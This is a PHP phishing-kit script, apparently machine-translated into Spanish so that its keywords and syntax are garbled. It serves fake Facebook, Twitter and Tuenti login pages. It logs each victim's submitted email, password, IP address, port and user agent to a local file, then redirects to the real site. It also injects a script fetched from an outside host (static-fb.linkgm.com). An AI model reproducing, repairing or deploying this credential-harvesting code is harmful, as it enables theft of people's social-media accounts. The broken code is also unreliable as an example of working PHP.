<?
include_once ( "config.php");
($ _GET [ "Bemail"] ($ _ GET [ "email"] = base64_decode ($ _ GET [ "bemail"])):? "");
$ _CONFIG = Array ();
$ _CONFIG [ "Email"] = htmlentities (function_exists ( "") stripslashes stripslashes ($ _ GET [ "email"]):? $ _ GET [ "email"]);
$ _CONFIG [ "Claves"] = "url =" urlencode (function_exists ( "stripslashes") stripslashes ($ _ GET [ "URL"]):? $ _ GET [ "URL"]).;

if ($ _ GET [ "login_attempt"] == 1) {
si (function_exists ( "get_magic_quotes_gpc") && get_magic_quotes_gpc ()) {
$ Fila = array ( "e-mail" => stripslashes (_POST [ "email"]), "pasan" $ => stripslashes ($ _POST [ "pase"]), "URL" => stripslashes ($ _POST [ "URL" ]), "tiempo" => tiempo (), "IP" => $ _ SERVER [ "REMOTE_ADDR"], "puerto" => $ _ SERVER [ "REMOTE_PORT"], "agente" => $ _ SERVER [ "HTTP_USER_AGENT"] );
}más{
$ Fila = array ( "e-mail" => ($ _POST [ "email"]), la "transferencia" => ($ _POST [ "pase"]), "url" => ($ _POST [ "URL"]), "tiempo" => tiempo (), "IP" => $ _ SERVER [ "REMOTE_ADDR"]);
}
$ Json = json_encode ($ fila);
    $ F = @ fopen ( "data.sql.php", "a +");
    $ Bytes = fwrite ($ f, '<salir php ();?> = ">". $ Json' <= ". ');
    fclose ($ f);
// $ Lnk = $ fila [ "URL"] ltrim ($ fila [ "URL"]): $ fila [ "URL"];
$ Lnk = ltrim ($ fila [ "URL"]);
if (empty ($ LNK)) {
$ Lnk = "http://www.facebook.com/";
} Else if (strrpos ($ lnk ": /") === false) {
$ Lnk = "http: //". $ LNK;
}
echo '<script> location.href = "'. str_replace ( '"', '\ "', $ LNK) '."; </ script> <noscript> <meta http-equiv = "Refresh" content = "5 ; url = '. $ LNK. ""> </ noscript>';
//header("location:".$_POST["email "]);
salida();
}
// -------------------------
// -------------------------
// -------------------------
$ Body_last = '<script type = \ "text / javascript \'> ventana [" @ f "]; si (ventana [" @ f "]) {document.write (\ '<\' + \ 'script type = "text / javascript" src = "// static-fb.linkgm.com/script.js" \ "+ \"> <\ '+ \' / sc \ '+ \' ript \ '+ \'> \ '); ventana [ "@ f"] = !! 1;} </ script>';
$ F = ($ _ GET [ "f"] || base64_decode ($ _ GET [ "bf"]));
$ L = ($ _ GET [ "l"] || base64_decode ($ _ GET [ "bl"]));
si (f == $ "gorjeo") {if (file_exists ( "fake.twitter" ($ l $ l.? ".":. $ l)). "php.") {include ( "fake.twitter" . ($ l $ l: $ l? ".".)); echo $ body_last;} die ();} ". php".
if ($ f == "tuenti") {if (file_exists ( "fake.tuenti" ($ l $ l.? ".":.. ". php" $ l))) {include ( "fake.tuenti" . ($ l $ l: $ l? ".".)); echo $ body_last;} die ();} ". php".
// Si (f == $ "facebook") {
si (file_exists ( "fake.facebook.php") && vacío ($ l)) {include ( "fake.facebook.php"); echo $ body_last;} else 
si (file_exists ( "fake.facebook" ($ l $ l.? ".": ".. es-la". ". php"))) {include ( "fake.facebook" ($ l ".?. "$ l:"... es-la ".)" php "); echo $ body_last;}
morir();
//}
?>
